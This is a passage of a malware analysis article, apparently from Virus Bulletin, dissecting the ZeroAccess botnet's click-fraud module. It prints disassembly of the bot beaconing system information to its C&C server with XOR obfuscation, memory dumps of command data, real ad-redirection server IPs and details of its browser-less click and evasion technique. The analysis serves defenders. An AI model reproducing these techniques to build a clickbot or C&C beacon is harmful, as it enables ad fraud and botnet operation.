TCP response.</b></p></div><p>After that, the data will be obfuscated using a XOR algorithm with key 0x72 before sending it to the randomly selected remote server that was previously stored in the global variable.</p><p>To avoid network latency, the main thread is suspended for a predetermined length of time specified in ZwDelayExecution. The suspended thread is resumed either when the time interval expires or when an alert is received from the ZwAlertThread API if the TCP data has been received and decoded successfully (see Listings 5 and 6). </p><pre class="programlisting">00960054   8a 00 05 01 fb 01 00 00-4d 59 6f 00 ff 00 4d 6f   ........MYo...Mo
00960064   7a 69 6c 6c 61 25 32 46-34 2e 30 2b 28 63 6f 6d   zilla%2F4.0+(com
00960074   70 61 74 69 62 6c 65 25-33 42 2b 4d 53 49 45 2b   patible%3B+MSIE+
00960084   37 2e 30 25 33 42 2b 57-69 6e 64 6f 77 73 2b 4e   7.0%3B+Windows+N
00960094   54 2b 35 2e 31 25 33 42-2b 2e 4e 45 54 2b 43 4c   T+5.1%3B+.NET+CL
009600a4   52 2b 32 2e 30 2e 35 30-37 32 37 25 33 42 2b 2e   R+2.0.50727%3B+.
009600b4   4e 45 54 2b 43 4c 52 2b-31 2e 31 2e 34 33 32 32   NET+CLR+1.1.4322
009600c4   25 33 42 2b 2e 4e 45 54-34 2e 30 43 25 33 42 2b   %3B+.NET4.0C%3B+


Offset   Description
0x00     Length of TCP data to be sent
0x02     Fixed value
0x03     Number of processor
0x04     Unknown value set by <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="ac949c9c9c9c9c9c9c82ec">[email&#160;protected]</a> plug-in DLL
0x08     Country code name
0x0a     Available physical page size
0x0c     Total physical page size
0x0e     User agent string obtained via ObtainUserAgentString

<span class="bold"><strong>Listing 4: System information that will be sent to the C&amp;C server and explanation of its data structure.</strong></span></pre><pre class="programlisting">.text:10003F14   mov    eax, edi
.text:10003F16   call   _SendSystemInfoDataToCnC
.text:10003F1B   push   offset Interval ; Interval
.text:10003F20   push   1   ; Alertable
.text:10003F22   call   ds:ZwDelayExecution 
.text:10003F28   cmp    eax, STATUS_ALERTED ; The thread will return here until Interval is timed out or ZwAlertThread(TRUE) is called
.text:10003F2D   jnz    short loc_10003F35
.text:10003F2F   push   edi
.text:10003F30   call   _ParseDecodedResponseFromCnCServer

<span class="bold"><strong>Listing 5: Send the first TCP connection to the C&amp;C server and wait for response by suspending thread.</strong></span></pre><pre class="programlisting">.text:10003AD8   cmp   ecx, 54h    ; Minimum response length
.text:10003ADB   jbe   short @@not_valid_response
.text:10003ADD   add   eax, 0Ch    ; HTTP response content
.text:10003AE0
.text:10003AE0 @@loop_decode:      ; CODE XREF: _DecodeCnCResponse+24j
.text:10003AE0   xor   byte ptr [eax], 72h
.text:10003AE3   inc   eax
.text:10003AE4   dec   ecx
.text:10003AE5   jnz   short @@loop_decode
.text:10003AE7   mov   eax, [esi+78h]
.text:10003AEA   push  dword ptr [eax+0Ch] ; ThreadHandle
.text:10003AED   call  ds:ZwAlertThread
.text:10003AF3 @@not_valid_response:     ; CODE XREF: _DecodeCnCResponse+Fj
.text:10003AF3   pop   esi
.text:10003AF4   retn  4

<span class="bold"><strong>Listing 6: Alert suspended thread after TCP response has been received and decoded.</strong></span></pre></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4898509"></a>Z00clicker&#39;s fraudulent click method</h2></div></div></div><p>The TCP response on port 12757 is merely a raw data set that needs to be pre-processed before the actual click fraud happens.</p><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id3619378"></a>Sorting the raw TCP data</h3></div></div></div><p>The data consists of a set of &lsquo;referrer&rsquo; URLs, each with at least one accompanying ad URL, for example: [referrer URL A][ad URL A.1][ad URL A.2], [referrer URL B][ad URL B.1] [ad URL B.2]. After all the URL sets have been parsed, a new array of data structure is populated in which every referrer string is associated with an ad URL.</p><p>This data structure is then sorted in descending order based on the aggregate click counter of an ad URL (at offset 0x04) (see <a href="#figure.6">Figure 6</a>), which is itself the result of the multiplier value (at offset 0x08) multiplied by the click counter at offset 0x0c+strlen(Referrer string) (see Listing 7).</p><div class="figure"><a id="figure.6"></a><div class="mediaobject"><img alt="Parsed URL set data structure before (left) and after (right) sorting." src="/uploads/images/figures/2013/04/ZeroAccess-6.jpg" /></div><p class="title"><b>Figure&nbsp;6.&nbsp;Parsed URL set data structure before (left) and after (right) sorting.</b></p></div><pre class="programlisting">009600a8   0000009d 0000000b 00000046 6f637469    ........F...itco
009600b8   69727970 2e746867 2f6d6f63 6466613f    pyright.com/?afd
009600c8   39783d74 7a6f6662 37767669 39727930    t=x9bfozivv70yr9
009600d8   776e766f 78307a72 32663979 306d6c64    ovnwrz0xy9f2dlm0
009600e8   38637537 39727877 6d393668 7826676f    7uc8wxr9h69mog&amp;x
009600f8   2633323d 26303d79 72616573 623d6863    =23&amp;y=0&amp;search=b
00960108   682b726b 746f7079 6b656568 0000d200    kr+hypotheek....
00960118   74746800 2f2f3a70 322e3539 312e3131    .http://95.211.1
00960128   312e3339 633f2f36 3d64696c 31613868    93.16/?clid=h8a1
00960138   34327370 307a7168 00000000             ps24hqz0....


Offset                          Description
0x00                            Offset to next URL set
0x04                            URL set identifier
0x08                            Multiplier to click counter
0x0c                            Referer string
0x0c+strlen(Referer string)     Click counter
0x0c+strlen(Referer string)+4   Array of ads URL ended with five null bytes

<span class="bold"><strong>Listing 7: Raw data received from the C&amp;C server and its data structure.</strong></span></pre><p>The first pair of referrer and ad URLs (on memory addresses 0x963694 and 0x96370d, respectively) is selected from the sorted data structure for use in the click fraud operation. This is considered a preliminary step to reduce the chances of having the clicks distributed too heavily on a particular URL &ndash; an unnatural pattern that may lead to the clicks being detected.</p></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id2305446"></a>The referrer and ad URLs</h3></div></div></div><p>It has been observed that the referrer URL always contains the strings &lsquo;afdt&rsquo; and &lsquo;search&rsquo; in its parameters. Based on our observation, the referrer appears to be the domain names owned by the botnet operator, although we have not been able to verify this as the registrant information has been protected. These domains do, however, have one thing in common: they are parked domains [<span class="citation"><a href="#citation.2">2</a></span>] that use very similar structures and page designs, even down to the colours used.</p><p>The ad URL contains common strings such as &lsquo;click&rsquo;, &lsquo;click2&rsquo;, &lsquo;clid&rsquo;, &lsquo;/feed/go.php&rsquo;, etc., and is a redirection URL hosted on ad redirection servers. The redirection URL starts off a chain of HTTP redirections, and usually there are three HTTP redirections before the ad server &ndash; the search engine platform operated by the advertising network &ndash; is reached.</p><div class="table"><a id="table.2"></a><table border="1" summary="Example referrers and ad redirection URLs."><colgroup><col /><col /></colgroup><thead><tr><th align="center">Example of referrer</th><th align="center">Example of ads redirection URL</th></tr></thead><tbody><tr><td>http://folkartstore.com/?afdt=tccchozb2v52nxvwlheuh8wd3ir 3uovlp5c890kusagv&amp;x=7&amp;y=10&amp;search=dentist+in+orange</td><td>http://95.211.216.156/?clid=gt71pprqpqz0</td></tr><tr><td>http://romantictouch.com/?afdt=4gn7s65pl6xrq256y98ze2z6r q6jk4gxvrvwww5a5mbs&amp;x=6&amp;y=10&amp;search=toner+skrivare</td><td>http://95.211.193.16/?clid=15p31pr02h3z0</td></tr><tr><td>http://fillpositions.com/?afdt=lh03hi7eoj9tsh6lmub2vvxvxzid gr1b0709e0yy1mco&amp;x=18&amp;y=18&amp;search=industrial+hearing+loss</td><td>http://46.229.160.175/click2.php?c=3dknGLO5eGQYDPtHRYWg434m%2FNfNnlFtyXhzoNlCY</td></tr><tr><td>http://itcopyright.com/?afdt=ix9ixvgg5a5hf6qonw5iq2nvjy3ti 7tazpx1e8gw30rl&amp;x=6&amp;y=11&amp;search=power+juicing</td><td>http://216.172.54.*/feed/go.php?id=[random_GUI_ID]&amp;sid=[32_random_hexadecimal]&amp;n=n -[random_number]&amp;tid=[random_number]&amp;s=3548</td></tr></tbody></table><p class="title"><b>Table&nbsp;2.&nbsp;Example referrers and ad redirection URLs.</b></p></div></div><div class="sect2" lang="en"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id3540382"></a>Click fraud with a window-less browser</h3></div></div></div><p>A &lsquo;traditional&rsquo; fraudulent click can be implemented in many ways. The most common ones used are:</p><div class="orderedlist"><ol type="1"><li><p>Intercepting <span class="emphasis"><em>Windows</em></span> network APIs such as send, recv, WSPSend, WSPrecv, HTTPSendRequest, InternetReadFile, etc.</p></li><li><p>Installing malicious browser add-ons to hijack search results.</p></li></ol></div><p>TDL, Redyms and Bamital are examples of malware families that perform <span class="emphasis"><em>Windows</em></span> network API interception. Medfos and Simda are examples of malware that will install malicious browser extensions. However, ZeroAccess uses neither of these methods.</p><p>ZeroAccess&rsquo;s click operation is carried out by the &lsquo;z00clicker3&rsquo; callback function when it receives a message sent by the main thread (see Listing 8). </p><pre class="programlisting">.text:10003C9A   push   ebx   ; lParam = Parsed URL set data structure after sorting
.text:10003C9B   push   1     ; wParam = Only 1 set of ads URL and referer to be sent
.text:10003C9D   push   406h  ; Msg = Send &ldquo;click fraud action&rdquo; message
.text:10003CA2   push   dword ptr [eax+8] ; hWnd = z00clicker3 window
.text:10003CA5   call   ds:SendMessageW

<span class="bold"><strong>Listing 8: The main thread sends a &lsquo;click fraud action&rsquo; message.</strong></span></pre><p>Upon receiving the message, z00clicker initiates an HTTP GET request using a random fake host name (which always contains the &lsquo;.cm&rsquo; TLD, which was retrieved from the first TCP connection). The GET query is a Base64-encoded string generated by first running the ad redirection URL through a XOR algorithm (without the HTTP protocol prefix, with key 0x69) and then encoding the result using the algorithm. The GET request is sent through the <span class="emphasis"><em>Windows</em></span> socket API, together with a fake host name, to the C&amp;C server address instead of sending the request to the non existent host name. The C&amp;C server replies with an HTTP 303 [<span class="citation"><a href="#citation.3">3</a></span>] response that contains the same ad redirection URL in the Location HTTP header field.</p><div class="figure"><a id="figure.7"></a><div class="mediaobject"><img alt="HTTP response 303." src="/uploads/images/figures/2013/04/ZeroAccess-7.jpg" /></div><p class="title"><b>Figure&nbsp;7.&nbsp;HTTP response 303.</b></p></div><p>The URL in the HTTP Location header field indicates the botnet&rsquo;s ad redirection server address. A separate GET request needs to be sent by the clickbot, which results in a series of HTTP 301/302 redirections that will reach the ad server.</p><p>An interesting thing found in z00clicker is its ability to mimic the way users interact with the ad server. It is able to do so without using Internet web browsers, which makes it unusual among clickbots. This is implemented with the following steps:</p><div class="orderedlist"><ol type="1"><li><p>A COM object instance of IHTMLDocument2 is created using CoCreateInstance.</p></li><li><p>A URL moniker is created from the ad URL using CreateURLMonikerEx.</p></li><li><p>A bind context object named &lsquo;__DWNBINDINFO&rsquo; is registered using ole32!CBindCtx::RegisterObjectParam. An important parameter in this function is a pointer to a data structure with various defined fields, most crucially the callback functions pointer. These callback functions ensure the attacker&rsquo;s desired referrer string is set in the HTTP header before the ad redirection URL is loaded. Once the click has completed, it reports the result of which ad redirection URL has been clicked to another server on UDP port 123.</p></li><li><p>The ad redirection URL is loaded via the IPersistMoniker::Load() function. Using this COM method, the clickbot is able to emulate user interaction with the websites by using a combination of three or four HTTP redirections.</p></li><li><p>After the ad redirection URL is loaded, the ad redirection server will be contacted, followed by multiple HTTP redirections to reach the ad control server. The ad control server determines which destination ad server the traffic will be forwarded to. The random search query specified in the referrer string will be processed from the ad server.</p></li></ol></div><p>A simplified overview of the redirections and servers involved in this process can be seen in Figure 8.</p><div class="figure"><a id="figure.8"></a><div class="mediaobject"><img alt="Click fraud HTTP redirection chain." src="/uploads/images/figures/2013/04/ZeroAccess-8.jpg" /></div><p class="title"><b>Figure&nbsp;8.&nbsp;Click fraud HTTP redirection chain.</b></p></div></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id2628669"></a>Conclusion</h2></div></div></div><p>ZeroAccess has undoubtedly introduced a lot of innovative ways of achieving its goals, so a dissection of the click fraud module provides an interesting insight into how it differs from other &lsquo;traditional&rsquo; clickbots. Highlights of the analysis include the country-specific targeting of the ZeroAccess click fraud, and the methods it uses to perform its fraudulent clicks without triggering the detection mechanisms used by search engines and online advertisers.</p><p>One of the remaining challenges in analysing the click fraud module involves circumventing the regional check implemented by the clickbot on both the client and the server&rsquo;s side. Without more in depth knowledge of how the client interacts with the server, researchers &ndash; and the online advertising networks &ndash; are hampered in recognizing and developing detection algorithms to identify the click fraud generated by ZeroAccess.</p><div class="bibliography"><div class="titlepage"><div><div><h3 class="title"><a class="chapter" id="id2657668"></a>Bibliography</h3></div></div></div><div class="bibliomixed"><a id="citation.1"></a><p class="bibliomixed">[1] Wyke, J. The ZeroAccess Botnet &ndash; Mining and Fraud for Massive Financial Gain. <span class="bibliosource"><a href="https://www.sophos.com/en-us/medialibrary/PDFs/technical papers/Sophos_ZeroAccess_Botnet.pdf" target="_blank">http://www.sophos.com/en-us/medialibrary/PDFs/technical%20papers/Sophos_ZeroAccess_Botnet.pdf</a></span>.</p></div><div class="bibliomixed"><a id="citation.2"></a><p class="bibliomixed">[2] Wikipedia. Domain parking. <span class="bibliosource"><a href="https://en.wikipedia.org/w/index.php?title=Domain_parking&amp;oldid=540558973" target="_blank">http://en.wikipedia.org/w/index.php?title=Domain_parking&amp;oldid=540558973</a></span>.</p></div><div class="bibliomixed"><a id="citation.3"></a><p class="bibliomixed">[3] Wikipedia. HTTP 303. <span class="bibliosource"><a href="https://en.wikipedia.org/w/index.php?title=HTTP_303&amp;oldid=544821406" target="_blank">http://en.wikipedia.org/w/index.php?title=HTTP_303&amp;oldid=544821406</a></span>.</p></div><div class="bibliomixed"><a id="citation.4"></a><p class="bibliomixed">[4] Microsoft Developer Network (MSDN). IpersisMoniker::Load method. <span class="bibliosource"><a href="https://msdn.microsoft.com/en-us/library/ms775044(v=vs.85).aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms775044(v=vs.85).aspx</a></span>.</p></div></div></div> </div>
<div class="col-md-3 col-sm-3 col-lg-3">
<div id="NDPHPBlock13359" class="NDPHPBlock">
<div style="width: 100%;"><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Tweet this!' href="https://twitter.com/share?text=A deeper look into the ZeroAccess clickbot&url=https://www.virusbulletin.com/virusbulletin/2013/04/deeper-look-zeroaccess-clickbot"><img src='/uploads/images/buttons/twitter.png' alt='twitter.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Facebook' href='https://www.facebook.com/sharer.php?u=https://www.virusbulletin.com/virusbulletin/2013/04/deeper-look-zeroaccess-clickbot'><img src='/uploads/images/buttons/fb.png' alt='fb.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on LinkedIn' href="https://www.linkedin.com/shareArticle?mini=true&url=https://www.virusbulletin.com/virusbulletin/2013/04/deeper-look-zeroaccess-clickbot&title=A deeper look into the ZeroAccess clickbot"><img src='/uploads/images/buttons/linkedin.png' alt='linkedin.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='Share on Hacker News' href="https://news.ycombinator.com/submitlink?u=https://www.virusbulletin.com/virusbulletin/2013/04/deeper-look-zeroaccess-clickbot&t=A deeper look into the ZeroAccess clickbot"><img src='/uploads/images/buttons/hackernews.png' alt='hackernews.png' width='45' height='45' class='responsive' /></a></center></div><div style='float: left; width: 20%; margin-left: auto; margin-right: auto; text-align: center;'><center><a target='_blank' title='reddit this!' href="https://www.reddit.com/submit?url=https://www.virusbulletin.com/virusbulletin/2013/04/deeper-look-zeroaccess-clickbot"><img src='/uploads/images/buttons/reddit.png' alt='reddit.png' width='45' height='45' class='responsive' /></a></center></div></div></div><p> </p>
<h2>Latest articles:</h2>
<div class="ccm-page-list">
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2022/04/cryptojacking-fly-teamtnt-using-nvidia-drivers-mine-cryptocurrency/" target="_self">Cryptojacking on the fly: TeamTNT using NVIDIA drivers to mine cryptocurrency</a>
</h3>
<div class="ccm-page-list-description">
TeamTNT is known for attacking insecure and vulnerable Kubernetes deployments in order to infiltrate organizations&rsquo; dedicated environments and transform them into attack launchpads. In this article Aditya Sood presents a new module introduced by&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/12/collector-stealer-russian-origin-credential-and-information-extractor/" target="_self">Collector-stealer: a Russian origin credential and information extractor</a>
</h3>
<div class="ccm-page-list-description">
Collector-stealer, a piece of malware of Russian origin, is heavily used on the Internet to exfiltrate sensitive data from end-user systems and store it in its C&amp;C panels. In this article, researchers Aditya K Sood and Rohit Chaturvedi present a 360&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/06/fighting-fire-fire/" target="_self">Fighting Fire with Fire</a>
</h3>
<div class="ccm-page-list-description">
In 1989, Joe Wells encountered his first virus: Jerusalem. He disassembled the virus, and from that moment onward, was intrigued by the properties of these small pieces of self-replicating code. Joe Wells was an expert on computer viruses, was partly&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/run-your-malicious-vba-macros-anywhere/" target="_self">Run your malicious VBA macros anywhere!</a>
</h3>
<div class="ccm-page-list-description">
Kurt Natvig wanted to understand whether it&rsquo;s possible to recompile VBA macros to another language, which could then easily be &lsquo;run&rsquo; on any gateway, thus revealing a sample&rsquo;s true nature in a safe manner. In this article he explains how he recompiled&hellip; </div>
<h3 class="ccm-page-list-title">
<a href="/virusbulletin/2021/04/dissecting-design-and-vulnerabilities-azorultccpanels/" target="_self">Dissecting the design and vulnerabilities in AZORult&nbsp;C&amp;C&nbsp;panels</a>
</h3>
<div class="ccm-page-list-description">
Aditya K Sood looks at the command-and-control (C&amp;C) design of the AZORult malware, discussing his team's findings related to the C&amp;C design and some security issues they identified during the research. </div>
</div>
<p><br /><a class="btn btn-block btn-warning" href="/virusbulletin/archive">Bulletin Archive</a></p> </div>
</div>
</div>

<footer class="bs-footer" role="contentinfo">
<div class="container">
<div class="bs-social">
<div class="row ">
<div class="col-md-3">
<p><a title="About Us" href="/about-vb/about-us/">About us</a></p>
<p><a title="Contact Us" href="/about-vb/contact-us/">Contact us</a></p>
<p><a title="Advisory Board" href="/about-vb/advisory-board/">Advisory board</a></p>
<p><a title="Press" href="/about-vb/press/">Press information</a></p>
<p><a title="Security Events Calendar" href="/resources/calendar/">Security events calendar</a></p>
<p><a title="Newsletter" href="/newsletter/">Virus Bulletin newsletter</a></p> </div>
<div class="col-md-3">
<p><a title="VB Testing" href="/testing/">Testing</a></p>
<p><a title="VB100" href="/testing/vb1001/">VB100</a></p>
<p><a title="VBSpam" href="/testing/vbspam/">VBSpam</a></p>
<p><a title="VBWeb" href="/testing/vbweb/">VBWeb</a></p>
<p><a title="Consultancy Services" href="/testing/consultancy-services/">Consultancy services</a></p>
<p><a title="The Spammers' Compendium" href="/resources/spammerscompendium/">Spammers' Compendium</a></p> </div>
<div class="col-md-3">
<p><a title="VB2021 localhost" href="/conference/vb2021/">VB2021 localhost</a></p>
<p><a title="VB2020 localhost" href="/conference/vb2020/">VB2020 localhost</a></p>
<p><a title="VB2019" href="/conference/vb2019/">VB2019 (London)</a></p>
<p><a title="VB2018" href="/conference/vb2018">VB2018 (Montreal)</a></p>
<p><a title="VB2017" href="/conference/vb2017">VB2017 (Madrid)</a></p>
<p><a title="Conference Archive" href="/conference/vb-conference-archive/">Older conferences</a></p> </div>
<div class="col-md-3">
<div class="row">
<table style="float: right;" border="0">
<tbody>
<tr>
<td align="center"><a href="/rss" target="_blank"><img title="Get our blog updates" src="/uploads/images/buttons/rss-square-gray.png" alt="rss.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://twitter.com/virusbtn" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on Twitter" src="/uploads/images/buttons/twitter-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.linkedin.com/company/virus-bulletin" target="_blank"><img class="bhtmbxoyxwpzahwcvxnw" title="Visit us on LinkedIn" src="/uploads/images/buttons/linkedin-square-gray.png" alt="linkedin.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.facebook.com/virusbulletin" target="_blank"><img title="Visit us on Facebook" src="/uploads/images/buttons/fb-square-gray.png" alt="twitter.png" width="35" height="35" /></a></td>
<td> </td>
<td align="center"><a href="https://www.youtube.com/user/virusbtn" target="_blank"><img title="Visit us on Youtube" src="/uploads/images/buttons/youtube-square-gray.png" alt="youtube.png" width="35" height="35" /></a></td>
</tr>
</tbody>
</table>
</div> </div>
</div>
<div class="row ">
<div class="col-md-12">
</div>
</div>
</div>
</div>
</footer>

<footer class="bs-footer2" role="contentinfo">
<div class="container">
<div class="bs-social2">
<div class="row ">
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
<div class="col-md-3">
</div>
</div>
<div class="row ">
<div class="col-md-12">
<p style="text-align: left;">©1989-2022 Virus Bulletin.        <a title="Privacy Policy" href="/about-vb/privacy-policy/">Privacy policy</a>        <a title="Cookies" href="/about-vb/privacy-policy/cookies/">Cookies</a>        <a title="Terms and Conditions" href="/about-vb/terms-and-conditions/">Terms and Conditions</a></p> </div>
</div>
</div>
</div>
</footer>

<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script async src="https://www.googletagmanager.com/gtag/js?id=UA-21876594-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-21876594-2', { 'anonymize_ip': true });
</script><script type="text/javascript" src="/libraries/js/fancybox.load.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/app.js"></script>
<div id="ccm-cookiesDisclosure" class="disclosure-bottom">
<div class="disclosure-container">
<div class="disclosure-content">
<p> We have placed cookies on your device in order to improve the functionality of this site, as outlined in our <a href="/about-vb/privacy-policy/cookies" target="_blank">cookies policy</a>. However, you may delete and block all cookies from this site and your use of the site will be unaffected. By continuing to browse this site, you are agreeing to Virus Bulletin's use of data as outlined in our <a href="/about-vb/privacy-policy/" target="_blank">privacy policy</a>.</p>
</div>
<div class="disclosure-form">
<form action="/index.php/cookies_disclosure/" method="POST">
<input type="hidden" name="allowCookies" value="1" />
<div class="button">
<input class="btn btn-info btn-sm" type="submit" name="submit" value="I understand. Don't show this message again!" />
</div>
</form>
</div>
<div class="ccm-spacer">&nbsp;</div>
</div>
</div>
</body>
</html>